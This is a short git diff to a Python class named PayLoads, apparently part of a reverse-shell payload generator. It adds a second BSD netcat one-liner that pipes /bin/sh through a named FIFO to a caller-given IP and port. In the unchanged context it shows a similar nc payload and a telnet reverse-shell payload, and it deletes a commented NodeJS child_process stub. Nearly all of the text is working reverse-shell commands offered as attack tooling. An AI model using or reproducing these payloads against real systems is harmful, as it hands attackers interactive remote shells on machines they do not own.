@@ -42,6 +42,7 @@ class PayLoads:
 
         # BSD payloads
         BSD = f'''mkfifo /tmp/lol;nc {ip} {port} 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol'''
+        BSD2= f'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'''
 
         # telnet payloads
         TELNET = f'''TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF'''
@@ -63,6 +64,3 @@ class PayLoads:
         if self.use_node:
             return self.nodejs(payloads + base64_payloads)
         return payloads + base64_payloads
-
-# NodeJS   --> will be an option to use because its a special case
-# require('child_process').exec('')
